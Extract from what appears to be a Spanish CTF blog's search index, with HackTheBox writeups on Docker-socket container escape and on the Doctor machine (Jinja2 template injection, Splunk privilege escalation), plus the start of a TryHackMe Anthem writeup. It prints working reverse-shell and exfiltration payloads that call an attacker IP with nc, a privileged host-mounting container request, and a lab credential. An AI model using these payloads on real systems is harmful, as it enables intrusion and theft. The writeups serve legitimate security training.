:5574537  },  {    Containers :-1,    Created :1588544489,    Id : sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9 ,    Labels :null,    ParentId :  ,    RepoDigests :[      &lt;none&gt;@&lt;none&gt;    ],    RepoTags :[      &lt;none&gt;:&lt;none&gt;    ],    SharedSize :-1,    Size :1056679100,    VirtualSize :1056679100  }]Tenemos √∫nicamente la imagen de sandbox, veamos que contenedores hay:  Las imagenes Docker son plantillas (que incluyen una aplicaci√≥n, los binarios y las librerias necesarias) que se utilizan para construir contenedores Docker. ElTallerdelBit root@2d24bf61767c:~# curl -s --unix-socket /var/run/docker. sock http://localhost/containers/json[  {    Id : 2d24bf61767ce2a7a78e842ebc7534db8eb1ea5a5ec21bb735e472332b8f9ca2 ,    Names :[      /saltstack    ],    Image : 188a2704d8b0 ,    ImageID : sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9 ,    Command : /usr/bin/dumb-init /usr/local/bin/saltinit ,    Created :1593520419,    Ports :[     {       PrivatePort :22,       Type : tcp      },     {       IP : 127. 0. 0. 1 ,       PrivatePort :4505,       PublicPort :4505,       Type : tcp      },     {       IP : 127. 0. 0. 1 ,       PrivatePort :4506,       PublicPort :4506,       Type : tcp      },     {       IP : 127. 0. 0. 1 ,       PrivatePort :8000,       PublicPort :8000,       Type : tcp      }   ],    Labels :{        },    State : running ,    Status : Up 18 hours ,    HostConfig :{      NetworkMode : default    },    NetworkSettings :{      Networks :{       bridge :{         IPAMConfig :null,         Links :null,         Aliases :null,         NetworkID : b4f085309fd324b75ee7b6982cb132fe7c9161732a000160fc79c8c5250492b0 ,         EndpointID : c457d7e08e1a5cfa6d124bd5a9fdff00b15edf121558d1a96ed12bfa0720a3e3 ,         Gateway : 172. 17. 0. 1 ,         IPAddress : 172. 17. 0. 2 ,         IPPrefixLen :16,         IPv6Gateway :  ,         GlobalIPv6Address :  ,         GlobalIPv6PrefixLen :0,         MacAddress : 02:42:ac:11:00:02 ,         DriverOpts :null      }     }   },    Mounts :[     {       Type : bind ,       Source : /var/run/docker. sock ,       Destination : /var/run/docker. sock ,       Mode :  ,       RW :true,       Propagation : rprivate      }   ]  }]Listones, podemos extraer el nombre y el ID del contenedor, pero nada m√°s, pues busquemos en internet como podemos aprovecharnos del demonio :)  Exposing /var/run/docker. sock could lead to full environment takeover. Dejandayoff. com Encontramos varias maneras con las cuales podemos romperlo. Podemos usar la opci√≥n exec, que simplemente cuando sea llamada ser√° ejecutada sobre el contenedor. Ac√° podemos indicarle el comando que queremos ejecutar:  Riesgos al tener el demonio /var/run/docker. sock accesible - Stackoverflow. com.  Peligros de exponer el demonio docker. sock - Dejandayoff. com. root@2d24bf61767c:~# curl -i -s --unix-socket /var/run/docker. sock -X POST -H  Content-Type: application/json  --data-binary '{ AttachStdin : true, AttachStdout : true, AttachStderr : true, Cmd : [ cat ,  /etc/passwd ], DetachKeys :  ctrl-p,ctrl-q , Privileged : true, Tty : true}' http://localhost/containers/2d24bf61767ce2a7a78e842ebc7534db8eb1ea5a5ec21bb735e472332b8f9ca2/execHTTP/1. 1 201 CreatedApi-Version: 1. 40Content-Type: application/jsonDocker-Experimental: falseOstype: linuxServer: Docker/19. 03. 8 (linux)Date: Tue, 22 Dec 2020 23:28:09 GMTContent-Length: 74{ Id : eff6b5d22c4b640f022d8f98b253a314b0a7cda0669ca1581d6916060d8dabdc }Con lo anterior creamos un ID para esa tarea exec que queremos ejecutar, as√≠ que ahora le indicamos que nos lo ejecute: root@2d24bf61767c:~# curl -i -s --unix-socket /var/run/docker. sock -X POST -H 'Content-Type: application/json' --data-binary '{ Detach : false, Tty : false}' http://localhost/exec/eff6b5d22c4b640f022d8f98b253a314b0a7cda0669ca1581d6916060d8dabdc/startHTTP/1. 1 200 OKContent-Type: application/vnd. docker. raw-streamApi-Version: 1. 40Docker-Experimental: falseOstype: linuxServer: Docker/19. 03. 8 (linux)root@2d24bf61767c:~# Pero no pasa nada :P Despu√©s de probar varias cositas, lo √∫nico que me dio respuesta fue hacer una petici√≥n hacia m√≠ m√°quina mediante wget o curl, pero no pude hacer nada con eso‚Ä¶ As√≠ que segu√≠ buscando. Algunos buenos post que intente y que explican muy bien:  A tale of escaping a hardened docker container - RedTimmy. com.  Understanding security risks of running docker containers - Ctl. io.  Abusing Docker API - SecurityBoulevard. com. Este √∫ltimo tiene varios links tambi√©n de apoyo con lindas referencias, miraremos una de ellas:  Owning system through exposed docker engine - Cert. litnet. lt. En √©l nos muestra como obtener ejecuci√≥n de comandos mediante la creaci√≥n de un contenedor adem√°s de hacer una montura sobre la carpeta que le indiquemos; nosotros usaremos la imagen de sandbox para la creaci√≥n del contenedor: root@2d24bf61767c:~# curl -i -s --unix-socket /var/run/docker. sock -X POST -H  Content-Type: application/json  http://localhost/containers/create?name=entramosOno -d '{ Image : sandbox ,  Cmd :[ /usr/bin/nc ,  10. 10. 14. 218 ,  4435 ,  -e ,  /bin/sh ],  Binds : [  /:/montadoPA  ],  Privileged : true}'Entonces, le indicamos que nos cree un container con el nombre entramosOno, que use la imagen sandbox y que cuando se ejecute haga una petici√≥n mediante nc a nuestra m√°quina para obtener una shell. Adem√°s de montar la ra√≠z (/) del sistema sobre la ruta montadoPA del contenedor :) D√©mosle: Perfecto, obtenemos la shell, veamos si tenemos la montura: ls -la /total 68drwxr-xr-x  1 root   root     4096 Dec 23 00:45 . drwxr-xr-x  1 root   root     4096 Dec 23 00:45 . . -rwxr-xr-x  1 root   root       0 Dec 23 00:45 . dockerenvdrwxr-xr-x  2 root   root     4096 May 29 2020 bindrwxr-xr-x  13 root   root     3740 Dec 23 00:45 devdrwxr-xr-x  1 root   root     4096 Dec 23 00:45 etcdrwxr-xr-x  2 root   root     4096 May 29 2020 homedrwxr-xr-x  7 root   root     4096 May 29 2020 libdrwxr-xr-x  5 root   root     4096 May 29 2020 mediadrwxr-xr-x  2 root   root     4096 May 29 2020 mntdrwxr-xr-x  20 root   root     4096 Jun 30 12:47 montadoPAdrwxr-xr-x  2 root   root     4096 May 29 2020 optdr-xr-xr-x 205 root   root       0 Dec 23 00:45 procdrwx------  2 root   root     4096 May 29 2020 rootdrwxr-xr-x  2 root   root     4096 May 29 2020 rundrwxr-xr-x  2 root   root     4096 May 29 2020 sbindrwxr-xr-x  2 root   root     4096 May 29 2020 srvdr-xr-xr-x  13 root   root       0 Dec 23 00:45 sysdrwxrwxrwt  2 root   root     4096 May 29 2020 tmpdrwxr-xr-x  7 root   root     4096 May 29 2020 usrdrwxr-xr-x  12 root   root     4096 May 29 2020 varMontado PAAAAAAA: ls -la /root   total 8drwx------  2 root   root     4096 May 29 2020 . drwxr-xr-x  1 root   root     4096 Dec 23 00:50 . . ls -la /montadoPA/roottotal 56drwx------  6 root   root     4096 Dec 22 20:05 . drwxr-xr-x  20 root   root     4096 Jun 30 12:47 . . lrwxrwxrwx  1 root   root       9 Jun 17 2020 . bash_history -&gt; /dev/null-rw-r--r--  1 root   root     3106 Dec 5 2019 . bashrcdrwx------  2 root   root     4096 Jun 30 09:23 . cachedrwxr-xr-x  3 root   root     4096 Jun 30 09:31 . local-rw-r--r--  1 root   root      161 Dec 5 2019 . profile-rw-r--r--  1 root   root      75 Jun 30 10:23 . selected_editordrwx------  2 root   root     4096 Jun 30 09:10 . ssh-rw-------  1 root   root     12235 Aug 26 14:28 . viminfo-rw-r--r--  1 root   root      165 Jun 30 11:59 . wget-hsts-rw-------  1 root   root      33 Dec 22 05:10 root. txtdrwxr-xr-x  3 root   root     4096 May 18 2020 snapEl √∫nico ‚Äúproblema‚Äù que veo es que no puedo ponerme una linda shell: # valid login shells/bin/sh/bin/ashPodr√≠amos enumerar sobre el contenedor y sobre la montura del sistema para as√≠ intentar obtener una shell completamente interactiva, pero con lo que respecta a la m√°quina hemos finalizado :P Solo nos quedar√≠a ver las flags: ‚Ä¶ Y nada m√°s. Impresionante m√°quina eh! Docker no deja de sorprenderme :P Aprend√≠ mucho, el inicio (como casi siempre) es lo m√°s ca√≥tico, pero me pareci√≥ superinteresante, adem√°s de ser una vulnerabilidad que no conoc√≠a. El pivoteo entre contenedores‚Ä¶ lindo lindo :) Muchas gracias por pasarse y nos leeremos en otra ocasi√≥n :) a seguir rompiendo todo. "
    }, {
    "id": 62,
    "url": "http://localhost:4000/htb/doctor",
    "title": "HackTheBox - Doctor",
    "body": "2021/02/06 - M√°quina Linux nivel f√°cil. Sencilla, pero algo inquietante al inicio, jugaremos con inyecci√≥n en templates, los logs nos hablar√°n y romperemos Splunk montando servidores fake por todos lados para ejecutar comandos.  TL;DR (Spanish writeup): Creador: egotisticalSW. Bueno bueno, inicio ca√≥tico, empezaremos jugando con el archivo /etc/hosts, encontraremos un login panel que est√° siendo ejecutado con la librer√≠a Werkzeug de Python. Despu√©s nos percataremos de una inyecci√≥n por templates (Server Side Template Injection), en este caso el marco Jinja2. Usaremos esto para ejecutar comandos en el sistema como el usuario web, as√≠ mismo obtendremos una reverse Shell (: Estando dentro y enumerando los logs de la m√°quina nos encontraremos con una contrase√±a para un servicio que tenemos en el puerto 8089 (Splunk) y su usuario shaun (que tambi√©n es usuario del sistema). Con esa contrase√±a tendremos acceso a la m√°quina y al servicio, 2x1 :) En internet nos encontraremos con un exploit que aprovecha la creaci√≥n de un servidor falso en nuestra m√°quina para ejecutar comandos mediante el servicio Splunk. Con √©l obtendremos una Shell como el usuario root. He creado un script para la generaci√≥n del usuario en la web, nos logea, crea el post malicioso y hace el despliegue de la Reverse Shell. Hechenle un ojito si quieren ;)  createuserdoctors. py‚Ä¶ Clasificaci√≥n de la m√°quina. : Neutral con puntos reales.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ Fases:  Enumeraci√≥n.  Explotaci√≥n.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Como siempre empezamos realizando un escaneo de puertos sobre la maquina para saber que servicios esta corriendo. ‚Äì¬ª nmap -p- --open -v 10. 10. 10. 209En este caso vamos a agregarle el parametro -T para hacer el escaneo m√°s rapido. ‚Äì¬ª nmap -p- --open -v -T5 10. 10. 10. 209A√∫n sigue lento, cambiemos el -T por --min-rate: ‚Äì¬ª nmap -p- --open -v --min-rate=2000 10. 10. 10. 209 -oG initScanPerfecto va mucho m√°s rapido.  Es importante hacer un escaneo total, sin cambios ni parametros de m√°s, asi vaya lento, que nos permita ver si obviamos/pasamos alg√∫n puerto.  ‚Äì¬ª nmap -p- --open -v -Pn 10. 10. 10. 203 -oG totalScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -Pn   Evita que realice Host Discovery, como ping (P) y el DNS (n)       -T   Forma de escanear super rapido, (hace mucho ruido, pero al ser un entorno controlado no nos preocupamos)       ‚Äìmin-rate   Indica que no queremos hacer peticiones menores al n√∫mero que pongamos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   ‚Äì¬ª cat initScan # Nmap 7. 80 scan initiated Wed Dec 9 25:25:25 2020 as: nmap -p- --open -v --min-rate=2000 -oG initScan 10. 10. 10. 209# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 209 ()  Status: UpHost: 10. 10. 10. 209 ()  Ports: 22/open/tcp//ssh///, 80/open/tcp//http///    Ignored State: filtered (65533)# Nmap done at Wed Dec 9 25:25:25 2020 -- 1 IP address (1 host up) scanned in 91. 31 secondsMuy bien, tenemos los siguientes servicios:       Puerto   Descripci√≥n         22   SSH: Conexion remota segura mediante una shell       80   HTTP: Servidor web   Hagamos nuestro escaneo de versiones y scripts en base a cada puerto, con ello obtenemos informaci√≥n m√°s detallada de cada servicio: ‚Äì¬ª nmap -p 22,80 -sC -sV 10. 10. 10. 209 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚Äì¬ª cat portScan # Nmap 7. 80 scan initiated Wed Dec 9 25:25:25 2020 as: nmap -p 22,80 -sC -sV -oN portScan 10. 10. 10. 209Nmap scan report for 10. 10. 10. 209Host is up (0. 19s latency). PORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 8. 2p1 Ubuntu 4ubuntu0. 1 (Ubuntu Linux; protocol 2. 0)80/tcp open http  Apache httpd 2. 4. 41 ((Ubuntu))|_http-server-header: Apache/2. 4. 41 (Ubuntu)|_http-title: DoctorService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Wed Dec 9 25:25:25 2020 -- 1 IP address (1 host up) scanned in 19. 24 secondsTenemos:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 8. 2p1 Ubuntu       80   HTTP   Apache httpd 2. 4. 41   ‚Ä¶ El escaneo total (totalScan) me mostro un nuevo puerto y el tipo de servicio era unknown, haciendo el escaneo de versiones y scripts, obtuvimos: . . . 8089/tcp open ssl/http Splunkd httpd| http-robots. txt: 1 disallowed entry|_/|_http-server-header: Splunkd|_http-title: splunkd| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser| Not valid before: 2020-09-06T15:57:27|_Not valid after: 2023-09-06T15:57:27Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel      Puerto   Descripci√≥n         8089   Splunk: Realiza busqueda, analisis y monitoreo de macrodatos, todo mediante una interfaz grafica   Pero validando en la web http://10. 10. 10. 209:8089/ sale error, posiblemente por el SSL, sigamos validando a ver que encontramos. ‚Ä¶ ‚Ä¢ Puerto 80 ‚åñ: Enumeremos a ver que podemos encontrar‚Ä¶ ‚Äì¬ª cat webScan # Nmap 7. 80 scan initiated Wed Dec 9 10:34:55 2020 as: nmap -p 80 --script=http-enum -oN webScan 10. 10. 10. 209Nmap scan report for 10. 10. 10. 209Host is up (0. 19s latency). PORT  STATE SERVICE80/tcp open http| http-enum: |  /css/: Potentially interesting directory w/ listing on 'apache/2. 4. 41 (ubuntu)'|  /images/: Potentially interesting directory w/ listing on 'apache/2. 4. 41 (ubuntu)'|_ /js/: Potentially interesting directory w/ listing on 'apache/2. 4. 41 (ubuntu)'# Nmap done at Wed Dec 9 10:35:25 2020 -- 1 IP address (1 host up) scanned in 30. 40 secondsRealizando un fuzz de directorios con nmap, mediante el script http-enum no vemos rutas escondidas u ocultas‚Ä¶ Sigamos. Encontramos:  Posible dominio: doctors. htb Posibles usuarios: Jade Guzman, Hannan Ford, James Wilson y Admin. Probemos colocando en el /etc/hosts el dominio, para que cuando hagamos una petici√≥n hacia 10. 10. 10. 209, nos resuelva hacia doctors. htb. ‚Äì¬ª cat /etc/hosts. . . 10. 10. 10. 209 doctors. htb. . . Ahora validemos en la web: Muy bien, tenemos un login panel (que tambien nos permite registrarnos) en el puerto 80, veamos si cambio algo ahora con el nuevo puerto: 8089.  Perfecto, tenemos la interfaz de splunk con algunas rutas, 2 de ellas funcionan (nos piden usuario y contrase√±a para entrar) y las otras 2 pues no :P ‚Ä¶ Validando el login panel ninguna credencial por default es valida, usando whatweb nos indica: ‚Äì¬ª whatweb http://doctors. htb/login?next=%2Fhttp://doctors. htb/login?next=%2F [200 OK] Bootstrap[4. 0. 0], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/1. 0. 1 Python/3. 8. 2], IP[10. 10. 10. 209], JQuery, PasswordField[password], Python[3. 8. 2], Script, Title[Doctor Secure Messaging - Login], Werkzeug[1. 0. 1]Esta usando una libreria de Python llamada [Werkzeug en su versi√≥n 1. 0. 1](https://werkzeug. palletsprojects. com/en/1. 0. x/) que permite entre otras cosas usar WSGI (Interfaz de puerta de enlace de un servidor web) para que los servidores reenvien solicitudes a aplicaciones web.  Info: Codigo Facilito / WSGIBuscando vulnerabilidades no existen a√∫n publicas, probemos a registrarnos: Your account has been created, with a time limit of twenty minutes!Entramos y tenemos: Si hacemos un reconocimiento de directorios con dirsearch tenemos: ‚Äì¬ª dirsearch. py -u http://doctors. htb -t 50 -w /opt/SecLists/Discovery/Web-Content/raft-small-directories. txt --cookie  session=. eJwlzjFuA0EIheG7TJ0CGGDAl1kxOyBbkRJp166i3N0bpXy_XvH9tK2OPO_t9jxe-dG2x2q3NgtzYBAoa7pNMfauw3Aim2o49iWLaOVwGcmBEVXQ5XpZQo9gItNIcFSB6JIyQXWH5c68rwIiqgE-S4t52aCeITWnDylpF-R15vGvoWvu51Hb8_szv64wcFo4wWRDNyfOJIfyhY5-ueKvs0T7fQMhET1g. X9EN1A. AaNm4WThP6qM6V-ogiPoLgMafAU  -q      Arg   Descripci√≥n         -t   Hilos con los que queremos que haga el proceso       -q   Para que simplemente nos muestre el reporte   302 - 217B - http://doctors. htb/logout -&gt; http://doctors. htb/home302 - 217B - http://doctors. htb/register -&gt; http://doctors. htb/home302 - 217B - http://doctors. htb/login -&gt; http://doctors. htb/home200 -  3KB - http://doctors. htb/home200 - 101B - http://doctors. htb/archive200 -  4KB - http://doctors. htb/accountCon el escaneo (y si vemos el codigo fuente (CTRL + U) de la pagina, vemos la referencia hacia /archive: Pero entrando a la ruta no obtenemos nada, simplemente una p√°gina blanca. Haciendo fuzz sobre esa ruta tampoco obtenemos nada‚Ä¶ Revisando podemos crear posts y nos los guarda en la ruta /user/lanz, probando con el usuario /admin tambi√©n tenemos respuesta, solo hay un post por parte de √©l: ‚Ä¶ Pues veamos si el apartado para crear post es vulnerable a alguna inyecci√≥n.  Despu√©s de estar demasiado tiempo estancado sin entender que deb√≠a hacer, ya que ninguna inyecci√≥n me mostraba algo y tampoco me funcionaban las t√≠picas sentencias blind. Me fui para el foro de la m√°quina, alguien dec√≠a que es una inyecci√≥n extra√±a que trata sobre Templates (ya que hab√≠an muchas dudas sobre si era SQLi). Tambi√©n hablaban de AllTheThings, lo cual me trajo a la mente un repositorio gigante de payloads para probar, lo busque y lo encontr√©: PayloadsAllTheThings. Primero busqu√© en internet Template injection y el resultado fue Server Side Template Injection (SSTi).  ‚ÄúTemplate engines are widely used by web applications to present dynamic data via web pages and emails. ‚Äù Portswigger Profundizando encontr√© que dependiendo el lenguaje de programaci√≥n, existen tipos de Templates, por lo tanto, diferentes tipos de explotaci√≥n, probando y tomando en cuenta que estamos corriendo una librer√≠a de Python podemos tener los siguientes Templates, Jinja2, Django, Mako. ‚Ä¶ Explotaci√≥n #: Pero testeando con la p√°gina no ve√≠a ning√∫n indicio de que algo estuviera pasando al probar los 3 tipos. Entre de nuevo en ‚Äúno s√© que probar‚Äù, de un momento a otro record√© a /archive (la rua que hab√≠amos encontrado en el fuzz y como comentario en el c√≥digo HTML), as√≠ que la abr√≠. En ese momento hab√≠a creado un post probando {{7*7}}, el cual si ve√≠amos en alg√∫n lado el n√∫mero 49, quiere decir que tendr√≠amos nuestra inyecci√≥n con Jinja2.  Revisando el fuente de /archive encontramos lo que buscabamos (: Bien, al probar los dos campos del post, el que nos genera la inyecci√≥n es el titulo, asi que podemos intentar ejecuci√≥n de comandos en el sistema:  Server Side Template Injection with Jinja2.  Perfecto, tenemos ejecuci√≥n de comandos en el sistema como web, intentemos obtener el archivo /etc/passwd. Ponemos en el titulo del post: {{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /etc/passwd | nc 10. 10. 14. 83 4433')['read']()}}Nos ponemos en escucha por el puerto 4433: ‚Äì¬ª nc -nlvp 4433listening on [any] 4433 . . . Vamos a /archive y ejecutamos, el resultado que tenemos en consola es: connect to [10. 10. 14. 83] from (UNKNOWN) [10. 10. 10. 209] 55928root:x:0:0:root:/root:/bin/bash. . . web:x:1001:1001:,,,:/home/web:/bin/bash. . . shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash Info sobre os y subprocess. Listo, pues veamos como obtener una reverse shell (: NOTA: ‚Äî Siguiendo esta guia, logramos obtener el index exacto (407) de la clase subprocess. Popen :P, con el cual tambien podemos ejecutar comandos: {{''. __class__. __mro__[1]. __subclasses__()[407]('ls -la',shell=True,stdout=-1). communicate()}}‚Äî :ATON Para conseguir la reverse shell podemos probar con netcat: {{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('nc 10. 10. 14. 83 4433 -e /bin/bash')['read']()}}o {{''. __class__. __mro__[1]. __subclasses__()[407]('nc 10. 10. 14. 83 4433 -e /bin/bash',shell=True,stdout=-1). communicate()}}Pero no obtenemos respuesta, probemos con la versi√≥n antigua, pueda que esa sea la que este instalada: {{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 10. 10. 14. 83 4433 &gt;/tmp/f')['read']()}}o {{''. __class__. __mro__[1]. __subclasses__()[407]('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 10. 10. 14. 83 4433 &gt;/tmp/f',shell=True,stdout=-1). communicate()}}Con cualquiera de las dos obtenemos la reverse sheeeeeeeeeeeeeeeeell :) Ahora a seguir enumerando (: ‚Ä¶ Cuando hicimos id con la inyecci√≥n, vimos un grupo llamada adm, es interesante:  adm: Group adm is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. Historically, /var/log was /usr/adm (and later /var/adm), thus the name of the group. Wiki Debian Lo siguiente nos da la raz√≥n, usando linpeas. sh encontramos esto en un archivo log: /home/shaun/splunk_whisperer. py:SPLUNK_PASSWORD =  Guitar123 Probemos con el puerto 8089 (donde esta el servicio Splunk) las credenciales: shaun:Guitar123.  Perfecto, estamos dentro‚Ä¶ (Casi me pasa lo mismo que con la m√°quina Cache, en la que encuentro una contrase√±a de otro servicio y no lo pruebo como contrase√±a de sistema y me pongo a enumerar y enumerar, despu√©s de tener todo ante m√≠ :P): web@doctor:~$ su shaunsu shaunPassword: Guitar123shaun@doctor:/home/web$ whoamiwhoamishaunshaun@doctor:/home/web$ ididuid=1002(shaun) gid=1002(shaun) groups=1002(shaun)shaun@doctor:/home/web$ Listo, d√©mosle candela pa convertirnos en root. Escalada de privilegios #: Buscando en internet sobre splunk y sus posibles vulnerabilidades, encontramos un repositorio con un exploit interesante que crea un servidor falso en nuestra m√°quina, el cual hace como ‚Äúruta o comunicador‚Äù para en la mitad del proceso entrar nosotros a ejecutar comandos.  SplunkWhisper2 (versi√≥n inspirada en una que hizo airman604).  Lindo articulo y el cual usaremos como gu√≠a para ejecutar comandos remotamente. Hay dos, el local y el remoto, usaremos el remoto, veamos que argumentos toma: . . . parser. add_argument('--scheme', default= https )parser. add_argument('--host', required=True)parser. add_argument('--port', default=8089)parser. add_argument('--lhost', required=True)parser. add_argument('--lport', default=8181)parser. add_argument('--username', default= admin )parser. add_argument('--password', default= changeme )parser. add_argument('--payload', default= calc. exe )parser. add_argument('--payload-file', default= pwn. bat ). . . Procedamos a cambiar a lo que tenemos: . . . parser = argparse. ArgumentParser()parser. add_argument('--scheme', default= https )parser. add_argument('--host', default= 10. 10. 10. 209 )parser. add_argument('--port', default=8089)parser. add_argument('--lhost', default= 10. 10. 14. 83 )parser. add_argument('--lport', default=8181)parser. add_argument('--username', default= shaun )parser. add_argument('--password', default= Guitar123 )parser. add_argument('--payload', default= calc. exe )parser. add_argument('--payload-file', default= pwn. bat ). . . Usaremos --payload en la ejecuci√≥n para alojar nuestros comandos ;) Generemos una Reverse Shell de una, tomemos el mismo con el que accedimos a web. ‚Äì¬ª python3 SplunkWhisperer2/PySplunkWhisperer2/PySplunkWhisperer2_remote. py --payload  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 10. 10. 14. 83 4434 &gt;/tmp/f  Listos, tamos dentro, bastante sencillo, aunque antes de encontrar este exploit, estaba un toque confundido usando otras herramientas, pero bueno, una b√∫squeda siempre confiable con Google: exploit splunk github. Veamos las flags: ‚Ä¶ M√°quina un poco traviesa al inicio, bastante sencilla la escalada, quiz√°s para compensar el mismo inicio. Gracias por pasarte y a seguir rompiendo todo (: "
    }, {
    "id": 63,
    "url": "http://localhost:4000/thm/anthem",
    "title": "TryHackMe - Anthem",
    "body": "2021/02/05 - M√°quina Windows nivel f√°cil. Jugaremos mucho a encontrar cosas en la web, caeremos en un Rabbit Hole con Umbraco (lindo, aprendimos bastante de esto) y accederemos remotamente a escritorios ajenos usando RDP.  TL;DR (Spanish writeup): El formato de tener que publicar el proceso, pero escondiendo la mayor√≠a no me gusta nada. Pero toca hacerlo, ya que al parecer el tema ‚Äúretirar‚Äù m√°quinas en TryHackMe no es un ¬´tema¬ª de conversaci√≥n :P Nos encontraremos con un servidor web alojando el CMS Umbraco, antes de abordarlo debemos recorrer las p√°ginas e ir encontrando flags o √≠tems. Una vez encontradas, nos enfrentaremos a un lindo Rabbit Hole en la explotaci√≥n del CMS Umbraco. Caeremos en cuenta que tenemos credenciales y un servicio para acceder remotamente a la m√°quina. As√≠ encontraremos el flag user. txt. Una vez dentro, enumeraremos y tendremos una carpeta oculta, la cual contiene un archivo al que no tenemos acceso. Validando los permisos del archivo vemos que somos el propietario, pero no tenemos acciones sobre √©l. Mediante icacls gestionaremos los permisos que tenemos hacia ese archivo y lograremos ver su contenido, tendremos una contrase√±a que nos servir√° para entrar al escritorio remoto del usuario Administrator.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ ¬øQu√© haremos?: El formato de TryHackMe es muy diferente al de HackTheBox, ya que algunas m√°quinas tienen preguntas que deben ser respondidas seg√∫n vayamos avanzando con la explotaci√≥n, as√≠ que respetaremos eso (tambi√©n para probar :P).  Website Analysis.  Spot the flags.  Final Stage. ‚Ä¶ Website Analysis #: Realizaremos un escaneo de puertos para saber que servicios est√° corriendo la m√°quina. ‚ù≠ nmap -p- --open -v 10. 10. 87. 37 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me extrae los puertos en la clipboard   ‚ù≠ cat initScan # Nmap 7. 80 scan initiated Thu Feb 4 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 87. 37# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 87. 37 ()  Status: UpHost: 10. 10. 87. 37 ()  Ports: **/open/tcp//http///, ****/open/tcp//ms-wbt-server///  Ignored State: filtered (65533)# Nmap done at Thu Feb 4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 585. 65 secondsPerfecto, tenemos:       Puerto   Descripci√≥n         ** (Pero creo que se entiende cual es)   HTTP       **   RPD   Hagamos nuestro escaneo de scripts y versiones en base a cada puerto, con ello obtenemos informacion mas detallada de cada servicio: ‚ù≠ nmap -p **,**** -sC -sV 10. 10. 87. 37 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚ù≠ cat portScan # Nmap 7. 80 scan initiated Thu Feb 4 25:25:25 2021 as: nmap -p **,**** -sC -sV -oN portScan 10. 10. 87. 37Nmap scan report for 10. 10. 87. 37Host is up (0. 34s latency). PORT   STATE SERVICE    VERSION**/tcp  open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)| http-robots. txt: 4 disallowed entries |_/***/ /*****/ /umbraco/ /umbraco_client/|_http-title: Anthem. com - Welcome to our blog****/tcp open ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: |  Target_Name: WIN-LU09299160F|  NetBIOS_Domain_Name: WIN-LU09299160F|  NetBIOS_Computer_Name: WIN-LU09299160F|  DNS_Domain_Name: WIN-LU09299160F|  DNS_Computer_Name: WIN-LU09299160F|  Product_Version: 10. 0. 17763|_ System_Time: 2021-02-04T22:17:08+00:00| ssl-cert: Subject: commonName=WIN-LU09299160F| Not valid before: 2021-01-02T15:57:43|_Not valid after: 2021-07-04T15:57:43|_ssl-date: 2021-02-04T22:17:23+00:00; 0s from scanner time. Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Thu Feb 4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 31. 22 secondsObtenemos:       Puerto   Servicio   Versi√≥n         **   HTTP   Microsoft HTTPAPI httpd 2. 0       **   RDP   Microsoft Terminal Services   Empecemos a responder preguntas :P ‚Ä¶ What port is for the web server?: Bueno, como vimos anteriormente, esta sobre el puerto ** (Igual por alg√∫n lado creo que se filtrara :P).  What port is for remote desktop service?: Tambi√©n lo vimos en el puerto ****. What is a possible password in one of the pages web crawlers check for?: Enumerando (y fij√°ndonos en el escaneo anterior) con robots. txt tenemos lo que parece ser una contrase√±a: ****************.  What CMS is the website using?: Apoyados en la imagen anterior (y tambi√©n del escaneo) sabemos que est√° usando el CMS Umbraco. What is the domain of the website?: Por varios sitios (y en el escaneo :P :P) vemos el dominio anthem. com. What‚Äôs the name of the 